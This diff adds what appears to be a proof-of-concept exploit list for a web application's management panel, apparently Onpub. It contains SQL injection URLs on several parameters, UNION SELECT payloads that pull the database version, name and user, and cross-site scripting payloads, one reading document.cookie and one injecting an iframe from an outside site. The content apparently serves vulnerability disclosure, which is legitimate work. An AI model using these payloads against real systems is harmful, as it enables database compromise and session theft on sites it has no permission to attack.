@@ -1,0 +1,29 @@
+SQL-injection:
+
+http://www.example.com/onpub/manage/index.php?onpub=EditWebsite&websiteID=-1%27[SQL-INJECTION 
+VULNERABILITY!]
+http://www.example.com/onpub/manage/index.php?onpub=EditArticles&fullTextSearch=1&keywords=-1%27[SQL-INJECTION 
+VULNERABILITY!]
+http://www.example.com/onpub/manage/index.php?onpub=EditWebsites&orderBy=-1%27[SQL-INJECTION 
+VULNERABILITY!]&order=ASC
+http://www.example.com/onpub/manage/index.php?onpub=EditArticles&orderBy=title&order=[SQL-INJECTION 
+VULNERABILITY!]
+http://www.example.com/onpub/manage/index.php?onpub=EditImage&imageID=2%27a[SQL-INJECTION 
+VULNERABILITY!]
+http://www.example.com/onpub/manage/index.php?onpub=EditArticle&articleID=1%20[SQL-INJECTION 
+VULNERABILITY!]
+
+http://www.example.com//index.php?onpub=EditWebsite&websiteID=-1 union 
+select 
+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,@@version--
+http://www.example.com//index.php?onpub=EditWebsite&websiteID=-1 union 
+select 
+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,@@database--
+http://www.example.com//index.php?onpub=EditWebsite&websiteID=-1 union 
+select 
+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,@@user--
+
+Cross-site scripting:
+
+http://www.example.com/onpub/manage/index.php?onpub=EditImages&page=2%27%22%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/onpub/manage/index.php?onpub=EditImages&page=137%20>"<iframe%20src=http://www.vulnerability-lab.com>
